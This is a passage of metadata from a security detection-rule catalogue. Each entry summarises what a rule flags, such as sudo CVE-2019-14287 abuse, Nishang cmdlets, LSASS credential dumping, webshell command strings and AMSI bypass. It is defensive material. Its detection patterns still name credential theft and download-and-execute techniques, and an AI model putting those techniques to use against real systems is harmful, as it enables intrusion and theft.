  Summary: This rule detects the obfuscated use of Clip.exe to execute PowerShell
    commands. It focuses on identifying specific patterns in the Windows Service Control
    Manager logs, particularly events with the EventID 7045. The detection is based
    on the presence of the terms 'cmd', '&&', and 'clipboard]::' within the ImagePath
    parameter, which are indicative of obfuscated command sequences used to evade
    security mechanisms and execute potentially malicious activities.
  Updated-Date: '2024_09_03'
f74107df-b6c6-4e80-bf00-4170b658162b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 25c7097a471c15b263a6bce56e3bbbc9
  Ruleset: core
  Summary: This rule detects attempts to exploit the sudo privilege escalation vulnerability
    identified as CVE-2019-14287. The exploit involves using the command line with
    the syntax ' -u#' to bypass restrictions and gain unauthorized elevated privileges.
    Such activities are flagged due to the high-security risks they pose.
  Updated-Date: '2024_09_03'
f742bde7-9528-42e5-bd82-84f51a8387d2:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8335320238b3ca11ac5eb49110df2fd3
  Ruleset: core
  Summary: This rule detects changes to registry keys related to the "Trusted Location"
    settings of Microsoft Office when the path is set to an uncommon value. Attackers
    might add additional trusted locations to circumvent macro security restrictions.
    The rule focuses on specific patterns in the registry objects and paths to identify
    potential defense evasion attempts, excluding known legitimate paths and default
    Office application directories to reduce false positives.
  Updated-Date: '2024_09_03'
f7536642-4a08-4dd9-b6d5-c3286d8975ed:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ac204dc6e22d68b7ce978ba21b5c382e
  Ruleset: emerging-threats
  Summary: This rule detects a specific child/parent process relationship indicative
    of a "WerFault" process running from the "WinSxS" directory as a service. This
    could be indicative of potential SNAKE malware activity, as reported by CISA.
    The detection focuses on processes where "services.exe" is the parent process
    and "WerFault.exe" located within "C:\Windows\WinSxS\" is the child process.
  Updated-Date: '2024_09_03'
f7644214-0eb0-4ace-9455-331ec4c09253:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7aedaad4ecf8a864227a9b32ad2b23bd
  Ruleset: core
  Summary: This rule detects failed Kerberos Ticket Granting Ticket (TGT) issue operations,
    which can indicate an attacker's manipulation of TGT messages. The detection focuses
    on specific Windows security event IDs and status codes that signify failure in
    these operations. Such failures may suggest credential access or manipulation
    attempts by an attacker.
  Updated-Date: '2024_09_03'
f772cee9-b7c2-4cb2-8f07-49870adc02e0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7bb5b993ee2a24e098f2e96033f03fe5
  Ruleset: core
  Summary: This rule detects the usage of specific commandlets and arguments associated
    with the Nishang exploitation framework in PowerShell script blocks. Nishang,
    which is hosted on GitHub, is a collection of PowerShell scripts used for penetration
    testing and offensive security practices. The rule looks for various malicious
    activities such as credential dumping, network relaying, brute force attacks,
    and downloading and executing payloads. Key terms monitored include commandlets
    like 'Invoke-MimikatzWDigestDowngrade', 'Invoke-CredentialsPhish', 'Invoke-SessionGopher',
    'Download-Execute', 'DumpCreds', and other functionalities intended for exfiltration
    and persistence techniques. Detection relies on script block logging being enabled
    on Windows systems to capture these malicious script executions.
  Updated-Date: '2024_09_03'
f7997770-92c3-4ec9-b112-774c4ef96f96:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8fd2627d97a3bac3b0e4eff08efbbe70
  Ruleset: sigmahq
  Summary: This rule detects when the 'AllowMultipleTSSessions' value is enabled in
    the Windows Registry, which permits multiple Remote Desktop Protocol (RDP) connection
    sessions to run simultaneously. This configuration can be exploited by attackers
    to maintain access to an RDP session without displacing other legitimate users.
  Updated-Date: '2024_09_04'
f7b5b004-dece-46e4-a4a5-f6fd0e1c6947:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e4e16634d08687778dac622b1fa1f483
  Ruleset: sigmahq
  Summary: This rule detects the creation of a new privileged account, such as an
    admin, within an Azure environment by monitoring audit logs for messages indicating
    the addition of a user or a new member to a role. The detection of such actions
    could indicate potential persistence or privilege escalation tactics, though legitimate
    new admin accounts can also trigger this detection.
  Updated-Date: '2024_09_04'
f7b5f842-a6af-4da5-9e95-e32478f3cd2f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 40b0a41864fea2ba133c5eedb1199231
  Ruleset: sigmahq
  Summary: This rule detects suspicious instances of the Windows Installer, `msiexec`,
    initiating processes with web addresses as parameters. This behavior is indicative
    of downloading and executing files from the internet, which can be associated
    with malware downloads or execution, such as the LokiBot information-stealing
    malware. Detection is based on the presence of web URL patterns in the command
    line of `msiexec`, which is typically used for legitimate software installations
    but can be exploited for malicious purposes.
  Updated-Date: '2024_09_04'
f7d7ebd5-a016-46e2-9c54-f9932f2d386d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e164290cbb22696b4d9b9f3e7692150a
  Ruleset: core
  Summary: This rule detects the execution of `ssh.exe` being used to perform data
    exfiltration and tunneling through Remote Desktop Protocol (RDP) by inspecting
    process creation logs on Windows systems. It specifically looks for instances
    where the image path ends with `\ssh.exe` and the command line contains the port
    `:3389`, which is commonly associated with RDP traffic. This behavior can indicate
    an attempt to use SSH for tunneling RDP sessions, a technique that may be used
    for evading network defenses and bypassing firewalls.
  Updated-Date: '2024_09_03'
f7f9ab88-7557-4a69-b30e-0a8f91b3a0e7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1736ecb587562e39eb995d71fe449582
  Ruleset: core
  Summary: This rule detects the presence of a specific registry key created during
    the execution of the Azorult malware. Azorult is a trojan that steals sensitive
    information such as passwords, cryptocurrency wallets, and other personal data
    from infected systems. The detection is triggered by registry events with particular
    Event IDs and target objects that meet the specified criteria.
  Updated-Date: '2024_09_03'
f8103686-e3e8-46f3-be72-65f7fcb4aa53:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5c5edfb35ab5939237ae3df2537a9fcf
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious events involving the "GetSigninToken"
    API in AWS. An attacker using the "aws_consoler" tool can exploit this API to
    create temporary federated credentials, concealing the compromised AWS credential
    (the original access key). This allows the attacker to transition from AWS CLI
    to console sessions without needing Multi-Factor Authentication (MFA) by using
    the new access key issued. Such activity can enable lateral movement within the
    compromised AWS account.
  Updated-Date: '2024_09_04'
f8341cb2-ee25-43fa-a975-d8a5a9714b39:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6da7af121b917d191dd775c4d5f7568f
  Ruleset: sigmahq
  Summary: This rule detects the usage of the unsafe option in the bpftrace tool on
    Linux systems by monitoring process creation logs. The detection specifically
    looks for instances where the bpftrace executable is invoked with the '--unsafe'
    command line argument. The 'unsafe' option in bpftrace can potentially allow for
    arbitrary code execution and other risky actions, making its monitoring crucial.
    The rule acknowledges that legitimate use cases for the unsafe option may exist
    but flags them due to the potential security risks involved.
  Updated-Date: '2024_09_04'
f8748f2c-89dc-4d95-afb0-5a2dfdbad332:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc75c0eec8c164422bbc1383d1b17a07
  Ruleset: core
  Summary: This rule detects the request for handles to the Security Accounts Manager
    (SAM) registry hive on Windows systems. It identifies such activity by monitoring
    for Event ID 4656, which corresponds to a specific object type "Key" and an object
    name ending in "\SAM". This behavior is associated with processes attempting unauthorized
    access to credential data stored within the SAM hive. The logs will capture details
    such as the computer name, domain name, user name, process name, and object name.
  Updated-Date: '2024_09_03'
f88e112a-21aa-44bd-9b01-6ee2a2bbbed1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 49cbceccbbfbc9dee1669578b40c1d44
  Ruleset: sigmahq
  Summary: This rule detects a failed logon attempt from a public IP address. Such
    login attempts can indicate a misconfigured firewall or network boundary, potentially
    exposing the system to unauthorized access attempts. The detection is based on
    Event ID 4625 in Windows security logs, excluding certain internal and private
    IP address ranges to focus on public IPs. This rule helps to identify potential
    unauthorized access or configuration issues in the network infrastructure.
  Updated-Date: '2024_09_04'
f8987c03-4290-4c96-870f-55e75ee377f4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: be745ae325ba845b12f8ad905224a22a
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit CVE-2023-22518, a vulnerability in
    Confluence Data Center and Confluence Server. An attacker can leverage this vulnerability
    to gain unauthorized access to create admin accounts and execute arbitrary commands.
    Specifically, the rule identifies when a process initiated by the Java-based Confluence
    application spawns child processes associated with known exploit behaviors, such
    as running `/bash`, downloading files with `/curl` or `/wget`, or executing commands
    with `/echo`. This detection mechanism helps to pinpoint malicious activity while
    reducing false positives by filtering out benign commands that normally include
    `ulimit -u`.
  Updated-Date: '2024_09_03'
f89b08d0-77ad-4728-817b-9b16c5a69c7a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 520dff7770f69555881ba62aeb8b7279
  Ruleset: core
  Summary: This rule detects the execution of the SharpImpersonation tool on Windows
    computers. SharpImpersonation is a utility used for manipulating security tokens,
    allowing an attacker to gain elevated rights either remotely (via tools like PsExec
    or WmiExec) or interactively. The detection focuses on specific file names and
    command line patterns associated with the tool, such as those involving user and
    binary references, execution with shellcode, and techniques like CreateProcessAsUserW
    and ImpersonateLoggedOnUser.
  Updated-Date: '2024_09_03'
f8a56cb7-a363-44ed-a82f-5926bb44cd05:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 880a7ce080cfc1416ea9542429576c3e
  Ruleset: core
  Summary: This rule detects the creation of a new Background Intelligent Transfer
    Service (BITS) transfer job where the local file, indicated by LocalName/Saved
    file, is saved in a potentially suspicious directory such as the desktop, public
    user directory, or performance logs directory.
  Updated-Date: '2024_09_03'
f8ad2e2c-40b6-4117-84d7-20b89896ab23:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75a432e70d2c4dc9acb13bc62a377b0a
  Ruleset: sigmahq
  Summary: This rule detects suspicious scanning activity on a network, where adversaries
    attempt to gather a listing of other systems by IP address, hostname, or other
    logical identifiers. The detection focuses on command lines containing 'for' or
    'foreach' loops and the usage of network tools such as 'nslookup' and 'ping',
    which may indicate an attempt to identify targets for lateral movement within
    the network from the current system.
  Updated-Date: '2024_09_04'
f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 22b4e499b9ffa89706029f15c638f677
  Ruleset: core
  Summary: This rule detects modifications to the Windows registry key "HKLM\Software\Microsoft\Windows
    NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist," where the value is set to
    "0." This change is made to hide a user account from being displayed on the logon
    screen.
  Updated-Date: '2024_09_03'
f8be3e82-46a3-4e4e-ada5-8e538ae8b9c9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e60fa973485800243e4ecf81b94df384
  Ruleset: core
  Summary: This rule detects the access of the LSASS (Local Security Authority Subsystem
    Service) process, which is indicative of potential credential dumping activity
    by tools created with Python, such as LaZagne or Pypykatz. It monitors for specific
    patterns within the call trace involving `_ctypes.pyd`, `KERNELBASE.dll`, and
    `ntdll.dll`, as well as the presence of Python dynamic link libraries (`python27.dll`
    or `python3*.dll`). The detection focuses on granted access permissions indicating
    a high level of access to the LSASS process, which is often sought after by credential
    dumping tools targeting Windows systems.
  Updated-Date: '2024_09_03'
f8d6a15e-4bc8-4c27-8e5d-2b10f0b73e5b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d208a78fbecce080ecb2b9fc5403ee02
  Ruleset: sigmahq
  Summary: This rule detects the suspicious execution of 'Powercfg.exe' to change
    lock screen timeout settings. Powercfg.exe is a command-line utility in Windows
    used for configuring power settings. Detecting such activity could indicate attempts
    to alter system behavior for persistence or defense evasion. Specifically, the
    rule identifies command lines that include parameters related to altering the
    active scheme's display timeout values or standby timeout settings for both AC
    and DC power.
  Updated-Date: '2024_09_04'
f8e9aa1c-14f2-4dbd-aa59-b98968ed650d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e28a3452f54e8c54a5a7c23dc0338ddb
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the legitimate AutoIt3 utility from
    a suspicious parent process. AutoIt3.exe is utilized within the DarkGate malware
    infection chain to execute shellcode that performs process injection and establishes
    a connection to the DarkGate command-and-control server.
  Updated-Date: '2024_09_03'
f91ed517-a6ba-471d-9910-b3b4a398c0f3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b953d23e0129bcee98bf4fe3f24c409b
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious child processes launched from
    applications inside the WindowsApps directory, which may indicate the execution
    of rogue ".appx" packages. It identifies instances where applications such as
    'cmd.exe', 'cscript.exe', 'mshta.exe', 'powershell.exe', 'pwsh.exe', 'regsvr32.exe',
    'rundll32.exe', and 'wscript.exe' are executed, particularly when the command
    line contains specific suspicious keywords, like 'cmd /c', 'Invoke-', or 'Base64'.
    It filters out legitimate processes related to Windows Terminal to reduce false
    positives.
  Updated-Date: '2024_09_04'
f92a6f1e-a512-4a15-9735-da09e78d7273:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ed6c086373c3fe907c9c3dd6399cf952
  Ruleset: sigmahq
  Summary: This rule detects the creation of specific files resulting from the execution
    of the built-in reconnaissance script "C:\Windows\System32\gatherNetworkInfo.vbs".
    The targeted file paths include files starting with "C:\Windows\System32\config"
    and ending with "\Hotfixinfo.txt", "\netiostate.txt", "\sysportslog.txt", or "\VmSwitchLog.evtx".
    This script is typically used for discovering network-related information on a
    Windows system.
  Updated-Date: '2024_09_04'
f956c7c1-0f60-4bc5-b7d7-b39ab3c08908:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: da9223e904884a45717aaddb9d6fb521
  Ruleset: sigmahq
  Summary: This rule detects the execution of PktMon, a tool used for capturing network
    packets on Windows systems. It monitors processes to identify instances where
    the executable 'pktmon.exe' or the original file name 'PktMon.exe' appears, which
    could indicate either legitimate use or potential credential access attacks.
  Updated-Date: '2024_09_04'
f9578658-9e71-4711-b634-3f9b50cd3c06:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5914b735e5c2f59d1855ff6e787cc7f1
  Ruleset: core
  Summary: This rule detects the usage of emojis in the command line on Windows systems,
    signaling potential defense evasion activity. Emojis in this context could be
    attempts by an attacker to bypass security measures or obscure their actions.
    Key emojis include a wide range of animals, plants, celestial bodies, weather
    symbols, food items, and various objects. The presence of such emojis in command
    lines is unusual and warrants further investigation to determine the intent and
    nature of the activity.
  Updated-Date: '2024_09_03'
f99276ad-d122-4989-a09a-d00904a5f9d2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 63ad81fd840c90b1a2a66ea21198f12e
  Ruleset: sigmahq
  Summary: "This rule detects actions that could indicate the clearing of PowerShell\
    \ history on a Windows system. It looks for specific payloads associated with\
    \ deleting history, such as commands that include 'del', 'Remove-Item', 'rm',\
    \ or the usage of '(Get-PSReadlineOption).HistorySavePath'. Additionally, it monitors\
    \ for configuring PowerShell to not save history through commands like 'Set-PSReadlineOption'\
    \ with parameters '\u2013HistorySaveStyle' or '-HistorySaveStyle' set to 'SaveNothing'."
  Updated-Date: '2024_09_04'
f9999590-1f94-4a34-a91e-951e47bedefd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2374edd5109c35f0f8b554d52ee4ab94
  Ruleset: core
  Summary: This rule detects suspicious child processes initiated by "provlaunch.exe,"
    which may signify potential misuse for proxy execution. It specifically monitors
    for child processes such as "calc.exe," "cmd.exe," "cscript.exe," "mshta.exe,"
    "notepad.exe," "powershell.exe," "pwsh.exe," "regsvr32.exe," "rundll32.exe," and
    "wscript.exe." Additionally, it looks for child processes that appear in directories
    like ":\PerfLogs\," ":\Temp\," ":\Users\Public\," "\AppData\Temp\," "\Windows\System32\Tasks\,"
    "\Windows\Tasks\," and "\Windows\Temp\". These signs help identify potential abnormal
    activities that may be associated with executing or scripting malicious actions
    through usual system processes.
  Updated-Date: '2024_09_03'
f99abdf0-6283-4e71-bd2b-b5c048a94743:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6fe8354f3d1648bc2577a692332cbd37
  Ruleset: core
  Summary: This rule detects instances where an Office application, such as Excel,
    PowerPoint, or Word, executes a document located in a trusted location. Attackers
    often exploit trusted locations to bypass macro security and execute malicious
    code. The detection criteria focus on process creation events, specifying parent
    processes like explorer.exe or dopus.exe, and monitoring command lines that point
    to default trusted directories, such as AppData\Roaming\Microsoft\Templates and
    Microsoft Office\root\Templates. This rule excludes certain template files to
    reduce false positives caused by normal user interactions with template documents.
  Updated-Date: '2024_09_03'
f9b3edc5-3322-4fc7-8aa3-245d646cc4b7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 621dc924a82069268c709b2e659ecfd2
  Ruleset: sigmahq
  Summary: This rule detects potential hijacking attempts of the Amazon SSM agent
    on Linux systems. An SSM agent hijack could facilitate command-and-control and
    persistence mechanisms by abusing the agent as a remote access Trojan. The detection
    focuses on the creation of specific processes associated with the SSM agent that
    include command-line arguments for registration, code, ID, and region parameters,
    as specified in the related Mitiga research report and various security advisories.
  Updated-Date: '2024_09_04'
f9df325d-d7bc-4a32-8a1a-2cc61dcefc63:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3525ba4448f7c905a0c3037bf3fcf4d3
  Ruleset: sigmahq
  Summary: "This rule detects unauthorized DLL sideloading within third-party software\
    \ applications, focusing specifically on software from Lenovo and Toshiba. For\
    \ Lenovo, it identifies the loading of \"commfunc.dll\" from atypical locations\
    \ outside the legitimate directories associated with Lenovo\u2019s Communications\
    \ Utility. For Toshiba, it monitors for the loading of \"tosbtkbd.dll\" from unusual\
    \ paths that differ from the directories linked to Toshiba's Bluetooth Stack.\
    \ The rule aims to identify potential security threats, such as defense evasion,\
    \ persistence mechanisms, and privilege escalation, by flagging deviations from\
    \ expected software behavior."
  Updated-Date: '2024_09_04'
fa00b701-44c6-4679-994d-5a18afa8a707:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 81e1a4c0732c30b69819f21fb5f5f2b7
  Ruleset: core
  Summary: This rule detects the execution of the AdvancedRun utility under high-privilege
    accounts such as TrustedInstaller, SYSTEM, Local Service, or Network Service.
    AdvancedRun, which allows users to run programs with various advanced options,
    including specific system privileges, is flagged due to the potential for misuse
    in privilege escalation or defense evasion attacks.
  Updated-Date: '2024_09_03'
fa0c05b6-8ad3-468d-8231-c1cbccb64fba:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 795db6fa246cc0e63a33278d803491d6
  Ruleset: core
  Summary: This rule detects a significant antivirus alert related to hack tools or
    other attack tools. It identifies specific signatures that start with or contain
    keywords associated with various offensive cybersecurity tools and malware. Some
    of the notable tools and malware it scans for include Adfind, Cobalt, Lazagne,
    Mimikatz, and Sliver, among others. These tools are often used for activities
    such as credential dumping, exploitation, reverse proxying, and unauthorized access
    which are indicative of malicious intent.
  Updated-Date: '2024_09_03'
fa1a7e52-3d02-435b-81b8-00da14dd66c1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e4ed46e3d1acb33c818647debd12777e
  Ruleset: sigmahq
  Summary: This rule detects the execution of "Diskshadow.exe" in script mode using
    the "/s" flag when the script is located in potentially suspicious locations,
    such as directories like 'Temp', 'Windows\Temp', 'AppData\Local', 'AppData\Roaming',
    'ProgramData', and '\Users\Public'. "Diskshadow.exe" is a utility used for managing
    volume shadow copies in Windows, often leveraged in advanced persistent threat
    (APT) activities for evasion and persistence mechanisms. The detection captures
    specific patterns in the file's original name, its command-line invocation containing
    the "-s" flag, and its execution path to identify potential misuse.
  Updated-Date: '2024_09_04'
fa2559c8-1197-471d-9cdd-05a0273d4522:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 32bda18feea715e5c96e95a109954af4
  Ruleset: sigmahq
  Summary: This rule detects the use of special strings and null bits intended to
    potentially bypass AMSI (Antimalware Scan Interface) functionalities in Windows
    PowerShell scripts. AMSI is a security feature designed to intercept and inspect
    scripts and macros at runtime for malicious content. The detection focuses on
    specific patterns in the script text, such as the presence of certain characters
    and constructs that are indicative of attempts to obfuscate the script to evade
    AMSI scans. This includes commonly known obfuscation techniques, such as embedding
    null characters within expressions.
  Updated-Date: '2024_09_04'
fa277e82-9b78-42dd-b05c-05555c7b6015:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 08c23a7b12f172204fd13a915b4700ac
  Ruleset: sigmahq
  Summary: This rule detects changes to the AppInstaller (winget) policy, specifically
    the activation of the local manifest installation. This policy change allows a
    user to install new packages via custom manifests, which could be utilized for
    both legitimate administrative purposes or malicious activities.
  Updated-Date: '2024_09_04'
fa3c117a-bc0d-416e-a31b-0c0e80653efb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e01e6b4f5be1ed653116c97a9af79d8b
  Ruleset: core
  Summary: This rule detects patterns in process executions indicative of activity
    by China Chopper-like tiny (ASPX) webshells. It specifically looks for certain
    command line executions associated with web server processes, such as `w3wp.exe`.
    The commands of interest include `&ipconfig&echo`, `&quser&echo`, `&whoami&echo`,
    `&c:&echo`, `&cd&echo`, `&dir&echo`, `&echo [E]`, and `&echo [S]`. These commands
    can help identify unauthorized use and potential persistence mechanisms employed
    by attackers leveraging such webshells.
  Updated-Date: '2024_09_03'
fa4aaed5-4fe0-498d-bbc0-08e3346387ba:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 027dc57be8c8e311736512845917c331
  Ruleset: core
  Summary: This rule detects when the sensitive system files "passwd" or "shadow"
    are copied from the /tmp/ directory. Such activity typically signifies an attempt
    to gain unauthorized access to user credentials on a Linux system. The detection
    focuses on process creation logs where the command line includes the /tmp/ path
    and references either the "passwd" or "shadow" files, carried out using the 'cp'
    command.
  Updated-Date: '2024_09_03'
fa5b1358-b040-4403-9868-15f7d9ab6329:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8ff42c27d12347453da37a066f09c5ee
  Ruleset: core
  Summary: This rule detects network connections initiated to various crypto mining
    pools, which are services used for pooling computing resources to mine cryptocurrencies
    like Monero and Ethereum. It monitors destination hostnames associated with well-known
    crypto mining pools such as minergate.com, nanopool.org, and xmrig.com. Identifying
    these connections can indicate unauthorized crypto mining activity, which may
    utilize system resources maliciously or without consent.
  Updated-Date: '2024_09_03'
fa84aaf5-8142-43cd-9ec2-78cfebf878ce:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f82114f121fb35dc4d7d9ef0516598c
  Ruleset: core
  Summary: This rule detects when a temporary access pass (TAP) is added to an account
    in Azure. TAPs assigned to privileged accounts should be carefully investigated
    to ensure there is no unauthorized access or potential security breach. The detection
    is based on identifying admin-registered security information and a specific status
    indicating that a TAP method was registered for a user. While legitimate administrative
    actions might trigger this detection, they should be validated to rule out false
    positives.
  Updated-Date: '2024_09_03'
fa935401-513b-467b-81f4-f9e77aa0dd78:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1028f0b985c461feb2ff565c1a70bdf1
  Ruleset: core
  Summary: This rule detects suspicious user agent strings in proxy logs that are
    commonly used by cryptocurrency mining software, specifically targeting those
    associated with XMRig and CCMiner. By identifying these user agent strings, the
    rule aims to uncover potential unauthorized cryptocurrency mining activities within
    a network. The detection looks for user agent strings that start with "XMRig "
    or "ccminer", which are indicative of these mining programs. This helps in monitoring
    and mitigating the risk of illicit crypto mining operations which can lead to
    resource depletion and security vulnerabilities. Key information such as the client
    IP, URI, and user agent are recorded for further analysis.
  Updated-Date: '2024_09_03'
faa48cae-6b25-4f00-a094-08947fef582f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 333df8ce223e355bbf195b68713b9217
  Ruleset: core
  Summary: This rule detects the execution of `rar.exe` via the command line to create
    an archive that includes password protection or specific compression levels. Using
    these options is often indicative of malicious activity, such as data exfiltration
    or obfuscating files.
  Updated-Date: '2024_09_03'
fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 626e5eea4700604f89849fa1e5735457
  Ruleset: sigmahq
  Summary: This rule detects the execution of "WerFault.exe" with the "-pr" command-line
    flag. "WerFault.exe" is typically associated with Windows Error Reporting, but
    the "-pr" flag can be used to execute files stored in the ReflectDebugger key.
    This might indicate an attempt to run malicious code by masquerading the execution
    flow, posing potential threats related to malware execution and defense evasion.
  Updated-Date: '2024_09_04'
fad91067-08c5-4d1a-8d8c-d96a21b37814:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 574489b5e30bb84f9165394e0462dc56
  Ruleset: sigmahq
  Summary: This rule detects changes to the PowerShell execution policy in order to
    bypass signing requirements for script execution. It specifically monitors registry
    settings associated with PowerShell execution policies and flags entries that
    are set to 'Bypass' or 'Unrestricted'. The rule accounts for potential false positives
    by filtering out legitimate changes made by system services, such as those using
    "gpedit". This helps identify unauthorized attempts to run unsigned or malicious
    scripts by altering execution policies.
  Updated-Date: '2024_09_04'
fadb84f0-4e84-4f6d-a1ce-9ef2bffb6ccd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 40eb61cf8e99ed89fedc72386199c37b
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "cloudflared" binary from non-standard
    locations on a Windows system. Cloudflared is a tool provided by Cloudflare that
    facilitates secure network connections through tunnels. By monitoring the execution
    path of the "cloudflared.exe" process, this rule distinguishes between legitimate
    and potentially suspicious activity, particularly if the binary is run from directories
    other than 'Program Files' or 'Program Files (x86)'.
  Updated-Date: '2024_09_04'
fb3722e4-1a06-46b6-b772-253e2e7db933:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b0ff99920a521bf24d6f6c729c540824
  Ruleset: sigmahq
  Summary: This rule detects function calls from the EditionUpgradeManager COM interface,
    which is an interface not typically used by standard executables. The detection
    focuses on monitoring the presence of 'editionupgrademanagerobj.dll' in the call
    trace. This behavior could be indicative of attempts to bypass User Account Control
    (UAC) or other forms of security defenses, potentially leading to privilege escalation.
  Updated-Date: '2024_09_04'
fb502828-2db0-438e-93e6-801c7548686d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05fce0724d38c6d495f031b0434ca99e
  Ruleset: emerging-threats
  Summary: This rule detects HTTP requests associated with Chafer malware by identifying
    specific URL patterns used to communicate with its command-and-control (C2) server.
    The Chafer malware is known for cyber-espionage activities and uses these HTTP
    requests to receive data from its C2 infrastructure. The pattern identified involves
    URLs containing '/asp.asp?ui=', which is characteristic of the malware's network
    traffic behavior.
  Updated-Date: '2024_09_03'
fb50eb7a-5ab1-43ae-bcc9-091818cb8424:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 27d9bc6f4ad9b2d82aaa3ec7cff9152a
  Ruleset: core
  Summary: This rule detects command lines that indicate unwanted modifications to
    registry keys, disabling crucial Internet Explorer security features such as IEHarden,
    DEPOff, and DisableFirstRunCustomize. Disabling these features poses a security
    risk by potentially allowing malicious activities to bypass typical security measures
    in Internet Explorer.
  Updated-Date: '2024_09_03'
fb656378-f909-47c1-8747-278bf09f4f4f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 898a0a67f9f969c03ad3a553959e2d78
  Ruleset: core
  Summary: This rule detects attempts at credential dumping by identifying the creation
    of remote threads by PowerShell processes into "lsass.exe" on Windows systems.
    Credential dumping is typically associated with the extraction of authentication
    credentials such as passwords, and "lsass.exe" (Local Security Authority Subsystem
    Service) is a common target due to its role in enforcing security policy and handling
    credentials. The rule looks for instances where either "powershell.exe" or "pwsh.exe"
    creates a remote thread in "lsass.exe," indicating a potential malicious activity
    aimed at gaining unauthorized access to sensitive information.
  Updated-Date: '2024_09_03'
fb843269-508c-4b76-8b8d-88679db22ce7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9740f3736f52cf6d1ba7850e055bba97
  Ruleset: sigmahq
  Summary: This rule detects the execution of PowerShell with a Base64-encoded payload
    by identifying specific command-line arguments associated with Base64 encoding.
    It monitors for instances where PowerShell or pwsh.exe processes are initiated
    with parameters such as '-e', '-en', '-enc', '-enco', or '-ec', but excludes cases
    where the argument '-Encoding' is present or when the process originates from
    certain permissible parent images like Microsoft Guest Configuration Worker. This
